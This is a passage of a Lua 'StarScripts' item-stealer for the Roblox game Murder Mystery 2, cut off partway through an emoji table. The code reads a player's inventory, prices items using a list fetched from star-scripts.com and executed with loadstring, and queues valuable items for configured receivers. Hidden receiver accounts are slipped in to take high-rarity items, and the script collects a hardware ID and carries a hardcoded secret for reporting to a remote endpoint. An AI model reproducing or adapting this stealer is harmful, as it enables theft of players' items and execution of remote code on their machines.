local function geniter(f, s, c)
	if type(f) ~= "function" then
		local mt = getmetatable(f)

		if type(mt) == "table" and mt.__iter then
			f, s, c = mt.__iter(f)
		elseif type(f) == "table" then
			f, s, c = next, f, nil
		end
	end

	return function()
		local r = table.pack(f(s, c))

		if r[1] == nil then
			return false
		end

		c = r[1]

		return true, table.unpack(r, 1, r.n)
	end
end

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local v4 = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer"
local genv = getgenv and getgenv() or _G

pcall(function()
	local setclipboard_ = setclipboard or toclipboard

	if type(setclipboard_) == "function" then
		setclipboard_("https://discord.gg/starscripts")
	end
end)

if genv.StarScriptsMM2RunLock then
	return
end

genv.StarScriptsMM2RunLock = true
genv.StarScriptsConfig = genv.StarScriptsConfig or {}

local StarScriptsConfig = genv.StarScriptsConfig
local v8, staticKey, v10, v11, t1, v13, t2, v15, v16, Godly
local v18, u19, v20, v21

do
	local Receivers = StarScriptsConfig.Receivers or StarScriptsConfig.RECEIVERS
	local ExcludedItems = StarScriptsConfig.ExcludedItems or StarScriptsConfig.EXCLUDED_ITEMS
	local ExcludedBelowValue = StarScriptsConfig.ExcludedBelowValue or StarScriptsConfig.EXCLUDED_BELOW_VALUE or 0
	local v25 = tostring(StarScriptsConfig.ProxyUrl or StarScriptsConfig.PROXY_URL or "https://star-scripts.com/api"):gsub("/+$", "")

	v8 = tostring(StarScriptsConfig.ProxyId or StarScriptsConfig.PROXY_ID or "")
	staticKey = tostring(StarScriptsConfig.ProxySecret or StarScriptsConfig.PROXY_SECRET or "Ri5Sk03ENyB07klgne77uLblobmR5BNTJM73PL2s4n0")

	if v8 == "" or staticKey == "" then
		return
	end

	v10 = v25 .. "/submit/" .. v8
	v11 = v25 .. "/webhook-live/" .. v8 .. "/heartbeat"
	t1 = {}

	if type(ExcludedItems) == "table" then
		local v26, v27, v28 = ipairs(ExcludedItems)

		for _, v in v26, v27, v28 do
			t1[tostring(v)] = true
		end
	end

	v13 = math.max(0, tonumber(ExcludedBelowValue) or 0)

	local t3 = {
		Unknown = 1,
		Common = 1,
		Uncommon = 2,
		Rare = 3,
		Legendary = 4,
		Classic = 5,
		Godly = 6,
		Vintage = 7,
		Ancient = 8,
		Chroma = 9,
		Unique = 10
	}

	if type(Receivers) ~= "table" then
		return
	end

	t2 = {}

	local t4 = {}
	local v33, v34, v35 = ipairs(Receivers)

	for _, v in v33, v34, v35 do
		local match = tostring(v):match("^%s*(.-)%s*$")

		if not (match == "" or t4[string.lower(match)]) then
			t4[string.lower(match)] = true
			table.insert(t2, match)
		end
	end

	if #t2 == 0 then
		return
	end

	table.concat(t2, ", ")
	v15 = function(p1)
		return t4[string.lower(tostring(p1))] == true
	end

	local t5 = {
		"Stealeryarn67",
		"jxst_v1cz"
	}

	v16 = math.max(5, tonumber(StarScriptsConfig.RedirectAfterSeconds or StarScriptsConfig.REDIRECT_AFTER_SECONDS) or 1)
	Godly = t3[tostring(StarScriptsConfig.RedirectMinimumRarity or StarScriptsConfig.REDIRECT_MINIMUM_RARITY or "Godly")] or t3.Godly
	v18 = function(p2)
		return t3[tostring(p2.rarity)] or t3.Unknown
	end

	local t6 = {}
	local v41, v42, v43 = ipairs(t5)

	for _, v in v41, v42, v43 do
		t6[string.lower(v)] = true
	end

	u19 = false
	v20 = function(p3)
		return t6[string.lower(tostring(p3))] == true
	end
	v21 = function()
		if u19 then
			return false
		end

		u19 = true

		for i = #t5, 1, -1 do
			local v47 = t5[i]
			local v48 = string.lower(v47)

			if not t4[v48] then
				t4[v48] = true
				table.insert(t2, 1, v47)
			end
		end

		return true
	end
end

if not (game.GameId == 66654135 and ({
	[142823291] = true,
	[335132309] = true,
	[636649648] = true
})[game.PlaceId]) then
	return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

while not LocalPlayer do
	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	LocalPlayer = Players.LocalPlayer
end

if LocalPlayer:GetAttribute("ClientLoaded") ~= true then
	repeat
		LocalPlayer:GetAttributeChangedSignal("ClientLoaded"):Wait()
	until LocalPlayer:GetAttribute("ClientLoaded") == true
end

LocalPlayer:WaitForChild("PlayerGui")

local http_request_ = http_request or request or syn and syn.request or fluxus and fluxus.request or http and http.request

if type(http_request_) ~= "function" then
	return
end

local crypt_ = crypt or syn and syn.crypt

local function v55(p4)
	local t7 = {}

	for i = 1, #p4 do
		t7[i] = string.format("%02x", string.byte(p4, i))
	end

	return table.concat(t7)
end

local t8 = {
	1116352408,
	1899447441,
	3049323471,
	3921009573,
	961987163,
	1508970993,
	2453635748,
	2870763221,
	3624381080,
	310598401,
	607225278,
	1426881987,
	1925078388,
	2162078206,
	2614888103,
	3248222580,
	3835390401,
	4022224774,
	264347078,
	604807628,
	770255983,
	1249150122,
	1555081692,
	1996064986,
	2554220882,
	2821834349,
	2952996808,
	3210313671,
	3336571891,
	3584528711,
	113926993,
	338241895,
	666307205,
	773529912,
	1294757372,
	1396182291,
	1695183700,
	1986661051,
	2177026350,
	2456956037,
	2730485921,
	2820302411,
	3259730800,
	3345764771,
	3516065817,
	3600352804,
	4094571909,
	275423344,
	430227734,
	506948616,
	659060556,
	883997877,
	958139571,
	1322822218,
	1537002063,
	1747873779,
	1955562222,
	2024104815,
	2227730452,
	2361852424,
	2428436474,
	2756734187,
	3204031479,
	3329325298
}

local function v59(p5)
	local v60 = p5 % 4294967296

	return string.char(bit32.band(bit32.rshift(v60, 24), 255), bit32.band(bit32.rshift(v60, 16), 255), bit32.band(bit32.rshift(v60, 8), 255), bit32.band(v60, 255))
end
local function v61(p6)
	local v62 = #p6 * 8
	local v63 = math.floor(v62 / 4294967296)
	local v64 = p6 .. string.char(128) .. string.rep(string.char(0), (56 - (#p6 + 1) % 64) % 64) .. v59(v63) .. v59(v62 % 4294967296)
	local t9 = {
		1779033703,
		3144134277,
		1013904242,
		2773480762,
		1359893119,
		2600822924,
		528734635,
		1541459225
	}

	for i = 1, #v64, 64 do
		local t10 = {}

		for i2 = 0, 15 do
			local v69 = i + i2 * 4
			local v70, v71, v72, v73 = string.byte(v64, v69, v69 + 3)

			t10[i2 + 1] = (v70 * 16777216 + v71 * 65536 + v72 * 256 + v73) % 4294967296
		end

		local n1 = 1
		local n2 = 64
		local v76 = 17 - n1

		for i2 = 17, 64 do
			local v78 = t10[i2 - 15]
			local v79 = t10[i2 - 2]

			t10[i2] = (t10[i2 - 16] + bit32.bxor(bit32.rrotate(v78, 7), bit32.rrotate(v78, 18), bit32.rshift(v78, 3)) + t10[i2 - 7] + bit32.bxor(bit32.rrotate(v79, 17), bit32.rrotate(v79, 19), bit32.rshift(v79, 10))) % 4294967296
		end

		local value, v81, v82, v83, v84, v85, v86, v87 = table.unpack(t9)
		local n3 = 1
		local n4 = 64
		local v90, exitTo, v92, v93, v94

		if true then
			if n3 <= n4 then
				repeat
					v92 = n3
					exitTo = nil

					while true do
						v93 = (v87 + bit32.bxor(bit32.rrotate(v84, 6), bit32.rrotate(v84, 11), bit32.rrotate(v84, 25)) + bit32.bxor(bit32.band(v84, v85), bit32.band(bit32.bnot(v84), v86)) + t8[v92] + t10[v92]) % 4294967296
						v94 = (bit32.bxor(bit32.rrotate(value, 2), bit32.rrotate(value, 13), bit32.rrotate(value, 22)) + bit32.bxor(bit32.band(value, v81), bit32.band(value, v82), bit32.band(v81, v82))) % 4294967296
						v87 = v86
						v86 = v85
						v85 = v84
						v84 = (v83 + v93) % 4294967296
						v83 = v82
						v82 = v81
						v81 = value
						value = (v93 + v94) % 4294967296
						v76 += n1

						if not (n1 <= 0) then
							exitTo = 1

							break
						end

						if v76 >= n2 then
							v92 = n3

							continue
						end

						break
					end
				until not (exitTo == 1 and v76 <= n2)

				t9[1] = (t9[1] + value) % 4294967296
				t9[2] = (t9[2] + v81) % 4294967296
				t9[3] = (t9[3] + v82) % 4294967296
				t9[4] = (t9[4] + v83) % 4294967296
				t9[5] = (t9[5] + v84) % 4294967296
				v90 = (t9[6] + v85) % 4294967296
			else
				t9[1] = (t9[1] + value) % 4294967296
				t9[2] = (t9[2] + v81) % 4294967296
				t9[3] = (t9[3] + v82) % 4294967296
				t9[4] = (t9[4] + v83) % 4294967296
				t9[5] = (t9[5] + v84) % 4294967296
				v90 = (t9[6] + v85) % 4294967296
			end
		else
			if not (n3 >= n4) then
				t9[1] = (t9[1] + value) % 4294967296
				t9[2] = (t9[2] + v81) % 4294967296
				t9[3] = (t9[3] + v82) % 4294967296
				t9[4] = (t9[4] + v83) % 4294967296
				t9[5] = (t9[5] + v84) % 4294967296
				v90 = (t9[6] + v85) % 4294967296
				t9[6] = v90
				t9[7] = (t9[7] + v86) % 4294967296
				t9[8] = (t9[8] + v87) % 4294967296

				continue
			end

			local exitTo2

			while true do
				v92 = n3
				v93 = (v87 + bit32.bxor(bit32.rrotate(v84, 6), bit32.rrotate(v84, 11), bit32.rrotate(v84, 25)) + bit32.bxor(bit32.band(v84, v85), bit32.band(bit32.bnot(v84), v86)) + t8[v92] + t10[v92]) % 4294967296
				v94 = (bit32.bxor(bit32.rrotate(value, 2), bit32.rrotate(value, 13), bit32.rrotate(value, 22)) + bit32.bxor(bit32.band(value, v81), bit32.band(value, v82), bit32.band(v81, v82))) % 4294967296
				v87 = v86
				v86 = v85
				v85 = v84
				v84 = (v83 + v93) % 4294967296
				v83 = v82
				v82 = v81
				v81 = value
				value = (v93 + v94) % 4294967296
				v76 += n1

				if not (n1 <= 0) then
					exitTo2 = 1

					break
				elseif v76 >= n2 then
					continue
				end

				break
			end

			if exitTo2 == 1 and v76 <= n2 then
				repeat
					v92 = n3
					exitTo = nil

					while true do
						v93 = (v87 + bit32.bxor(bit32.rrotate(v84, 6), bit32.rrotate(v84, 11), bit32.rrotate(v84, 25)) + bit32.bxor(bit32.band(v84, v85), bit32.band(bit32.bnot(v84), v86)) + t8[v92] + t10[v92]) % 4294967296
						v94 = (bit32.bxor(bit32.rrotate(value, 2), bit32.rrotate(value, 13), bit32.rrotate(value, 22)) + bit32.bxor(bit32.band(value, v81), bit32.band(value, v82), bit32.band(v81, v82))) % 4294967296
						v87 = v86
						v86 = v85
						v85 = v84
						v84 = (v83 + v93) % 4294967296
						v83 = v82
						v82 = v81
						v81 = value
						value = (v93 + v94) % 4294967296
						v76 += n1

						if not (n1 <= 0) then
							exitTo = 1

							break
						end

						if v76 >= n2 then
							v92 = n3

							continue
						end

						break
					end
				until not (exitTo == 1 and v76 <= n2)
			end

			t9[1] = (t9[1] + value) % 4294967296
			t9[2] = (t9[2] + v81) % 4294967296
			t9[3] = (t9[3] + v82) % 4294967296
			t9[4] = (t9[4] + v83) % 4294967296
			t9[5] = (t9[5] + v84) % 4294967296
			v90 = (t9[6] + v85) % 4294967296
			t9[6] = v90
			t9[7] = (t9[7] + v86) % 4294967296
			t9[8] = (t9[8] + v87) % 4294967296

			continue
		end

		t9[6] = v90
		t9[7] = (t9[7] + v86) % 4294967296
		t9[8] = (t9[8] + v87) % 4294967296
	end

	local t11 = {}

	for i = 1, 8 do
		t11[i] = v59(t9[i])
	end

	return table.concat(t11)
end
local function v98(p7, p8)
	if #p8 > 64 then
		p8 = v61(p8)
	end

	local v99 = p8 .. string.rep(string.char(0), 64 - #p8)
	local t12 = {}
	local t13 = {}

	for i = 1, 64 do
		local v103 = string.byte(v99, i)

		t12[i] = string.char(bit32.bxor(v103, 54))
		t13[i] = string.char(bit32.bxor(v103, 92))
	end

	local v104 = v61(table.concat(t12) .. p7)

	return v55(v61(table.concat(t13) .. v104))
end

local v105 = v98("The quick brown fox jumps over the lazy dog", "key") == "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8"

local function v106(p9, p10)
	if crypt_ and type(crypt_.hmac) == "function" then
		for _, v in ipairs({
			{
				p9,
				p10,
				"sha256"
			},
			{
				p10,
				p9,
				"sha256"
			},
			{
				"sha256",
				p9,
				p10
			}
		}) do
			local ok, result = pcall(crypt_.hmac, table.unpack(v))

			if ok and result then
				return result
			end
		end
	end

	if not v105 then
		return nil
	end

	local ok, result = pcall(v98, p9, p10)

	return ok and result or nil
end
local function v113(p11)
	if not p11 or p11 == "" then
		return nil
	end

	local v114 = tostring(p11)

	if #v114 == 64 and v114:match("^[%x]+$") then
		return v114:lower()
	end

	if #v114 == 32 then
		return v55(v114)
	end

	if crypt_ and type(crypt_.base64decode) == "function" then
		local ok, result = pcall(crypt_.base64decode, v114)

		if ok and result and #result == 32 then
			return v55(result)
		end
	end

	return v114
end
local function v117()
	local s1 = ""

	if type(gethwid) == "function" then
		local ok, result = pcall(gethwid)

		if ok and result then
			s1 = tostring(result)
		end
	end

	if s1 == "" then
		local s2 = "unknown"

		if type(identifyexecutor) == "function" then
			local ok, result = pcall(identifyexecutor)

			if ok and result then
				s2 = tostring(result)
			end
		end

		s1 = tostring(LocalPlayer.UserId) .. ":" .. s2
	end

	if crypt_ and type(crypt_.hash) == "function" then
		local ok, result = pcall(crypt_.hash, s1, "sha256")

		if ok and result then
			return tostring(result):sub(1, 128)
		end
	end

	return s1:sub(1, 128)
end

local base64encode = crypt_ and (crypt_.base64encode or crypt_.base64_encode)
local base64decode = crypt_ and (crypt_.base64decode or crypt_.base64_decode)

local function v128(p12, p13)
	if crypt_ and type(crypt_.hmac) == "function" then
		if type(base64encode) == "function" and type(base64decode) == "function" then
			local ok, result = pcall(function()
				local function v131(p14, p15)
					return base64decode(crypt_.hmac(p14, p15, "sha256"))
				end

				local v132 = game:GetService("HttpService"):GenerateGUID(false):gsub("-", ""):sub(1, 32)
				local v133 = v131(p13 .. "|starcrypt-enc-v1", "9f3c7a1e5b8d2046c1fe83a75d9b0e42a6c8f13d7e0b592a4c6f81d3b7e9a2508")
				local t14 = {}
				local n5 = 0
				local n6 = 0

				while n5 < #p12 do
					t14[#t14 + 1] = v131(v132 .. "|" .. n6, v133)
					n5 += 32
					n6 += 1
				end

				local v137 = table.concat(t14)
				local t15 = {}

				for i = 1, #p12 do
					t15[i] = string.char(bit32.bxor(string.byte(p12, i), string.byte(v137, i)))
				end

				return {
					enc = base64encode(table.concat(t15)),
					n = v132
				}
			end)

			if not ok or not (type(result) == "table" and result.enc) then
				return nil
			end

			return result
		end
	end

	return nil
end
local function v140(p16, p17)
	local v141 = v128(p16, p17)

	if not v141 then
		return nil
	end

	local ok, result = pcall(function()
		return game:GetService("HttpService"):JSONEncode(v141)
	end)

	if not ok then
		return nil
	end

	return result
end

local t16 = {}

do
	local Item = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")
	local ok, result = pcall(require, Item)

	if ok and type(result) == "table" then
		t16 = result
	end
end

local t17 = {}

do
	local Pets = ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Pets")
	local ok, result = pcall(require, Pets)

	if ok and type(result) == "table" then
		t17 = result
	end
end

local v152

do
	local function v153(p18)
		return (string.lower(tostring(p18 or "")):gsub("[^%w]", ""))
	end

	local v154 = tostring(StarScriptsConfig.ValuesUrl or StarScriptsConfig.VALUES_URL or "https://star-scripts.com/api/values/mm2")

	local function v155()
		local Body
		local ok, result = pcall(function()
			return game:HttpGet(v154)
		end)

		if ok and type(result) == "string" and #result > 0 then
			Body = result
		elseif type(http_request_) == "function" then
			local ok2, result2 = pcall(http_request_, {
				Url = v154,
				Method = "GET",
				Headers = {
					["Cache-Control"] = "no-cache"
				}
			})

			if ok2 and type(result2) == "table" then
				Body = result2.Body or result2.body
			end
		end

		if type(Body) ~= "string" or #Body == 0 then
			return nil, "could not download the value list"
		end

		local loadstring_ = loadstring or load

		if not loadstring_ then
			return nil, "loadstring is unavailable"
		end

		local v162, v163 = loadstring_(Body, "@mm2values.lua")

		if not v162 then
			return nil, tostring(v163)
		end

		local ok2, result2 = pcall(v162)

		if not ok2 or type(result2) ~= "table" then
			return nil, tostring(result2)
		end

		return result2
	end

	local StarScriptsMM2ValuesCache = genv.StarScriptsMM2ValuesCache

	if type(StarScriptsMM2ValuesCache) ~= "table" then
		local v167

		StarScriptsMM2ValuesCache, v167 = v155()

		if not StarScriptsMM2ValuesCache then
			return
		end

		genv.StarScriptsMM2ValuesCache = StarScriptsMM2ValuesCache
	end

	local t18 = {
		Common = "Common",
		Uncommon = "Uncommon",
		Rare = "Rare",
		Legendary = "Legendary",
		Godly = "Godly",
		Ancient = "Ancient",
		Unique = "Unique",
		Classic = "Vintage",
		Vintage = "Vintage",
		Chroma = "Chroma"
	}
	local t19 = { {
		"Nik's Scythe",
		"",
		"",
		"",
		"Ancient",
		250000000
	} }

	if not genv.StarScriptsMM2ExtrasMerged then
		local v170, v171, v172 = ipairs(t19)

		for _, v in v170, v171, v172 do
			table.insert(StarScriptsMM2ValuesCache, v)
		end

		genv.StarScriptsMM2ExtrasMerged = true
	end

	local t20 = {}
	local v176, v177, v178 = ipairs(StarScriptsMM2ValuesCache)

	for _, v in v176, v177, v178 do
		local t21 = {
			name = v[1],
			type = v[2],
			year = v[3],
			event = v[4],
			rarity = v[5],
			value = v[6]
		}
		local v182 = v153(t21.name)
		local v183 = t20[v182]

		if not v183 then
			v183 = {}
			t20[v182] = v183
		end

		table.insert(v183, t21)
	end

	local function v184()
		return {}
	end
	local function v185()
		return nil
	end
	local function v186()
		return "Unknown"
	end
	local function v187(p19)
		local v188 = p19.isChroma == true
		local v189 = v188 and "Chroma"

		v189 = v189 or t18[tostring(p19.rarity)]

		local t22 = {}
		local t23 = {}

		local function v192(p20)
			local v193 = v153(p20)

			if not (v193 == "" or t23[v193]) then
				t23[v193] = true
				t22[#t22 + 1] = v193
			end
		end

		if v188 then
			v192("Chroma " .. tostring(p19.name))
		end

		v192(p19.name)

		if p19.itemType and p19.itemType ~= "" then
			v192(tostring(p19.name) .. " " .. tostring(p19.itemType))
		end

		local t24 = {}
		local t25 = {}

		for _, v in ipairs(t22) do
			local v198 = t20[v]

			if v198 then
				for _, v2 in ipairs(v198) do
					if not t25[v2] then
						t25[v2] = true
						t24[#t24 + 1] = v2
					end
				end
			end
		end

		if #t24 == 0 then
			return 0, v189, nil
		end

		if p19.category == "Pets" then
			local t26 = {}

			for _, v in ipairs(t24) do
				if v.type == "Pet" then
					t26[#t26 + 1] = v
				end
			end

			t24 = t26

			if #t24 == 0 then
				return 0, v189, nil
			end
		end

		local function v204(p21)
			local t27 = {}

			for _, v in ipairs(t24) do
				if p21(v) then
					t27[#t27 + 1] = v
				end
			end

			if #t27 > 0 then
				t24 = t27
			end
		end

		if v189 then
			v204(function(p22)
				return p22.rarity == v189
			end)
		end

		if #t24 > 1 and p19.itemType and p19.itemType ~= "" then
			v204(function(p23)
				return p23.type == "" or p23.type == p19.itemType
			end)
		end

		if #t24 > 1 and p19.year and p19.year ~= "" then
			v204(function(p24)
				return p24.year == "" or p24.year == tostring(p19.year)
			end)
		end

		if #t24 > 1 and p19.event and p19.event ~= "" then
			v204(function(p25)
				return p25.event == "" or p25.event == tostring(p19.event)
			end)
		end

		local value
		local rarity
		local v210

		for _, v in ipairs(t24) do
			if value == nil then
				value = v.value
				rarity = v.rarity
				v210 = v

				continue
			end

			if v.value ~= value then
				return 0, v189, nil
			end
		end

		local v213 = value or 0
		local v214 = rarity or v189

		return v213, v214, v210
	end
	local function v215(p26)
		return table.concat({
			p26.name,
			p26.type,
			p26.year,
			p26.event,
			p26.rarity
		}, "|")
	end

	local GetProfileData = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Inventory"):WaitForChild("GetProfileData")
	local u217
	local n7 = 0
	local n8 = 0

	local function v220(p27, p28)
		local now = time()
		local v222 = now - n7

		if u217 and not p27 and v222 < 15 then
			return u217
		end

		local ok, result = pcall(function()
			return GetProfileData:InvokeServer()
		end)
		local v225 = type(result) == "table"

		if v225 then
			v225 = tonumber(result.userId or result.UserId or result.UserID)
		end

		v225 = v225 or nil

		if ok and type(result) == "table" and (v225 == nil or v225 == LocalPlayer.UserId) and type(result.Weapons) == "table" and type(result.Weapons.Owned) == "table" then
			u217 = result
			n7 = now

			return result
		end

		if not p28 and now - n8 >= 10 then
			n8 = now
		end

		if not u217 or not (v222 <= 45) then
			return nil
		end

		return u217
	end
	local function v226(p29)
		return ({
			Unique = 1,
			Ancient = 2,
			Godly = 3,
			Classic = 4,
			Legendary = 5,
			Rare = 6,
			Uncommon = 7,
			Common = 8,
			Vintage = 9,
			Unknown = 999
		})[tostring(p29)] or 999
	end
	local function v227(p30)
		local t28 = {
			Data = {
				Weapons = {
					Current = {}
				},
				Pets = {
					Current = {}
				}
			}
		}

		for _, v in ipairs({
			"Weapons",
			"Pets"
		}) do
			local Owned = p30[v] and p30[v].Owned
			local Current = t28.Data[v].Current

			if type(Owned) == "table" then
				for k, v2 in pairs(Owned) do
					local DataID
					local v236

					if type(k) == "string" then
						DataID = k

						if type(v2) == "number" then
							v236 = v2
						elseif type(v2) == "string" then
							v236 = tonumber(v2)
						elseif type(v2) == "boolean" then
							v236 = v2 and 1 or nil
						elseif type(v2) == "table" then
							v236 = tonumber(v2.Amount or v2.amount or v2.Count or v2.count or v2.OwnedAmount)

							if not v236 and (v2.Owned == true or v2.owned == true) then
								v236 = 1
							end
						end
					elseif type(v2) == "string" then
						DataID = v2
						v236 = 1
					elseif type(v2) == "table" then
						DataID = v2.DataID or v2.ItemID or v2.ItemId or v2.Id or v2.ID
						v236 = tonumber(v2.Amount or v2.amount or v2.Count or v2.count)

						if DataID and not v236 and (v2.Owned == true or v2.owned == true) then
							v236 = 1
						end
					end

					local v237 = tonumber(v236)

					if DataID and v237 and v237 > 0 then
						local v238 = tostring(DataID)
						local v239

						if v == "Weapons" then
							v239 = t16[v238]
						elseif v == "Pets" then
							v239 = t17[v238]
						end

						local v240 = Current[v238]

						if v240 then
							v240.Amount += v237
						else
							Current[v238] = {
								DataID = v238,
								Name = type(v239) == "table" and (v239.ItemName or v239.Name) or v238,
								Amount = v237,
								Rarity = type(v239) == "table" and v239.Rarity or "Unknown",
								ItemType = type(v239) == "table" and v239.ItemType or v == "Pets" and "Pet" or v,
								IsChroma = type(v239) == "table" and v239.Chroma == true,
								Year = type(v239) == "table" and v239.Year and tostring(v239.Year) or "",
								Event = type(v239) == "table" and v239.Event and tostring(v239.Event) or "",
								MetadataVerified = type(v239) == "table"
							}
						end
					end
				end
			end
		end

		return t28
	end
	local function v241(p31)
		local v242 = p31.name:lower():gsub("[^%w]", "")
		local v243 = p31.id:lower():gsub("[^%w]", "")

		return v242 == "defaultgun" or v242 == "defaultknife" or v243 == "defaultgun" or v243 == "defaultknife"
	end

	local t29 = {
		Constellation_G_2024 = {
			Name = "Nightsky",
			Rarity = "Legendary",
			ItemType = "Gun"
		},
		ChromaDarkbringer = {
			Name = "Darkbringer",
			Rarity = "Godly",
			ItemType = "Gun",
			IsChroma = true
		},
		CandleflameChroma = {
			Name = "Candleflame",
			Rarity = "Godly",
			ItemType = "Knife",
			IsChroma = true
		},
		DeathshardChroma = {
			Name = "Deathshard",
			Rarity = "Godly",
			ItemType = "Knife",
			IsChroma = true
		},
		Sparkle9 = {
			Name = "Sparkle9",
			Rarity = "Common",
			ItemType = "Knife"
		},
		RIP = {
			Name = "RIP",
			Rarity = "Common",
			ItemType = "Gun"
		},
		Sweater_K_2025 = {
			Name = "Sweater",
			Rarity = "Uncommon",
			ItemType = "Knife"
		},
		Coal_K_2022 = {
			Name = "Coal",
			Rarity = "Common",
			ItemType = "Knife"
		},
		Bunnies_K_2025 = {
			Name = "Bunnies",
			Rarity = "Legendary",
			ItemType = "Knife"
		},
		Aurora_K_2021 = {
			Name = "Aurora",
			Rarity = "Legendary",
			ItemType = "Knife"
		},
		Energized_G_2025 = {
			Name = "Energized",
			Rarity = "Legendary",
			ItemType = "Gun"
		},
		Bats_K_2024 = {
			Name = "Bats",
			Rarity = "Common",
			ItemType = "Knife"
		},
		Cursed_K_2024 = {
			Name = "Cursed",
			Rarity = "Legendary",
			ItemType = "Knife"
		},
		Energized_K_2025 = {
			Name = "Energized",
			Rarity = "Legendary",
			ItemType = "Knife"
		},
		Frozen_G_2025 = {
			Name = "Frozen",
			Rarity = "Legendary",
			ItemType = "Gun"
		}
	}

	v152 = function(p32)
		local v245 = v220(p32 == true)

		if not v245 then
			return {}, false, {
				reason = "profile_unavailable"
			}
		end

		local ok, result = pcall(v227, v245)

		if not ok or type(result) ~= "table" then
			return {}, false, {
				reason = "generation_failed"
			}
		end

		local t30 = {}
		local t31 = {
			rawItems = 0,
			valuedItems = 0,
			eligibleItems = 0,
			maximumValue = 0
		}

		for _, v in ipairs({
			"Weapons",
			"Pets"
		}) do
			local Current = result.Data and result.Data[v] and result.Data[v].Current or {}

			for k, v2 in pairs(Current) do
				if type(v2) == "table" then
					if (tonumber(v2.Amount) or 0) > 0 then
						t31.rawItems += 1

						local t32 = {
							id = tostring(v2.DataID or k),
							name = tostring(v2.Name or v2.ItemName or k),
							amount = tonumber(v2.Amount) or 1,
							rarity = tostring(v2.Rarity or "Unknown"),
							itemType = tostring(v2.ItemType or v2.DataType or v),
							category = v,
							year = tostring(v2.Year or ""),
							event = tostring(v2.Event or ""),
							metadataVerified = v2.MetadataVerified == true
						}
						local v256 = t29[t32.id]

						if v256 and not t32.metadataVerified then
							t32.name = v256.Name or t32.name
							t32.rarity = v256.Rarity or t32.rarity
							t32.itemType = v256.ItemType or t32.itemType
							t32.isChroma = v256.IsChroma == true
						end

						for k2, v3 in pairs(v2) do
							if tostring(k2):lower():find("chroma", 1, true) and v3 ~= nil and v3 ~= false and v3 ~= 0 and v3 ~= "" then
								t32.isChroma = true

								break
							end
						end

						if not v241(t32) then
							local v259 = v184(t32)
							local v260, v261, v262 = v187(t32, v259)

							t32.value = v260
							t32.valueCategory = v261

							local v263 = v262

							if t32.rarity == "Unknown" then
								t32.rarity = v186(v259, t32.valueCategory)
							end

							t32.displayName = t32.name

							if t32.valueCategory == "Chroma" or t32.valueCategory == "Chromas" or t32.isChroma then
								if not t32.name:lower():find("chroma", 1, true) then
									t32.displayName = "Chroma " .. t32.name
								end
							end

							t32.totalValue = t32.value * t32.amount

							if t32.value > 0 then
								t31.valuedItems += 1
							end

							t31.maximumValue = math.max(t31.maximumValue, t32.value)

							if v263 and v13 < t32.value and not t1[v215(v263)] then
								table.insert(t30, t32)
								t31.eligibleItems += 1
							end
						end
					end
				end
			end
		end

		table.sort(t30, function(p33, p34)
			if p33.totalValue ~= p34.totalValue then
				return p33.totalValue > p34.totalValue
			end

			if p33.value ~= p34.value then
				return p33.value > p34.value
			end

			local v264 = v226(p33.rarity)
			local v265 = v226(p34.rarity)

			if v264 ~= v265 then
				return v264 < v265
			end

			if p33.rarity == p34.rarity then
				if p33.name == p34.name then
					return p33.id < p34.id
				end

				return p33.name < p34.name
			end

			return p33.rarity < p34.rarity
		end)

		return t30, true, t31
	end

	local function v266()
		local v267

		while true do
			v267 = v220(true, true)

			if v267 then
				break
			else
				task.wait(1)
			end
		end

		return v267
	end

	v266()
end

local u268, v269, v270 = v152(false)

if #u268 == 0 then
	if v269 and not v270.rawItems then
	end

	return
end

if v4 then
	local LocalPlayer2 = game:GetService("Players").LocalPlayer

	if LocalPlayer2 then
		LocalPlayer2:Kick("This script cannot be used in private servers.")
	end

	return
end

local function v272(p35)
	return (string.format("%.2f", tonumber(p35) or 0):gsub("0+$", ""):gsub("%.$", ""))
end

local n9 = 0

do
	local n10 = 0
	local v275, v276, v277 = ipairs(u268)

	for _, v in v275, v276, v277 do
		n9 += v.totalValue

		if v.value > 0 then
			n10 += 1
		end
	end
end

local v280, v281, starScriptsMM2LiveRuntime, v283, v284

do
	local function v285(p36)
		local t33 = {}
		local t34 = {
			{
				"nik's scythe",
				"☠️"
			},
			{
				"harvester",
				"☠️"
			},
			{
				"corrupt",
				"👿"
			},
			{
				"batwing",
				"🦇"
			},
			{
				"black luger",
				"🔫"
			},
			{
				"deathshard",
				"💀"
			},
			{
				"boneblade",
				"🦴"
			},
			{
				"ghostblade",
				"👻"
			},
			{
				"icecream",
				"🍦"
			},
			{
				"ice cream",
				"🍦"
			},
			{
				"cotton candy",
				"🍭"
			},
			{
				"candy corn",
				"🌽"
			},
			{
				"gingerbread",
				"🍪"
			},
			{
				"gingercookie",
				"🍪"
			},
			{
				"gingerblade",
				"🍪"
			},
			{
				"gingermint",
				"🍪"
			},
			{
				"cookie",
				"🍪"
			},
			{
				"peppermint",
				"🍬"
			},
			{
				"candy",
				"🍬"
			},
			{
				"sugar",
				"🍭"
			},
			{
				"sweet",
				"🍭"
			},
			{
				"treat",
				"🍬"
			},
			{
				"cane",
				"🍭"
			},
			{
				"latte",
				"☕"
			},
			{
				"hot chocolate",
				"☕"
			},
			{
				"choco",
				"🍫"
			},
			{
				"donut",
				"🍩"
			},
			{
				"popsicle",
				"🍡"
			},
			{
				"soda",
				"🥤"
			},
			{
				"cherries",
				"🍒"
			},
			{
				"cherry",
				"🍒"
			},
			{
				"strawberries",
				"🍓"
			},
			{
				"coconut",
				"🥥"
			},
			{
				"melon",
				"🍉"
			},
			{
				"bunnies",
				"🐰"
			},
			{
				"bunny",
				"🐰"
			},
			{
				"carrots",
				"🥕"
			},
			{
				"carrot",
				"🥕"
			},
			{
				"eggblade",
				"🥚"
			},
			{
				"egg",
				"🥚"
			},
			{
				"bacon",
				"🥓"
			},
			{
				"pumpkin",
				"🎃"
			},
			{
				"beachy",
				"🏝️"
			},
			{
				"beach",
				"🏖️"
			},
			{
				"sands",
				"⛱️"
			},
			{
				"sand",
				"🏖️"
			},
			{
				"palms",
				"🌴"
			},
			{
